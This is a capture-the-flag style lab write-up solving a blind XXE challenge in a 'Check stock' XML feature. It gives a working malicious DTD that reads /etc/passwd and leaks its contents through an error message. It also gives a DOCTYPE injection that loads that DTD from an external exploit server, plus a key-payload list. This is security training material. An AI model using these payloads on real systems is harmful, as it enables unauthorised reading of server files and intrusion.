## Exploiting blind XXE to retrieve data via error messages

**Category:** xxe
**Difficulty:** Unknown

### Description
This lab has a "Check stock" feature that parses XML input but does not display the result.

### Solution Steps
1. Click "Go to exploit server" and save the following malicious DTD file on your server: <!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil; When imported, this page will read the contents of /etc/passwd into the file entity, and then try to use that entity in a file path.
2. Click "View exploit" and take a note of the URL for your malicious DTD.
3. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
4. Insert the following external entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]> You should see an error message containing the contents of the /etc/passwd file.

### Key Payloads
- `/etc/passwd`
- `<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;`
- `file`
- `stockCheck`
- `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`

### Indicators of Success
- External entity resolved
- Local file contents returned (/etc/passwd)
- DNS/HTTP callback received (blind XXE)
- DTD fetched from external server
- Error messages reveal file contents
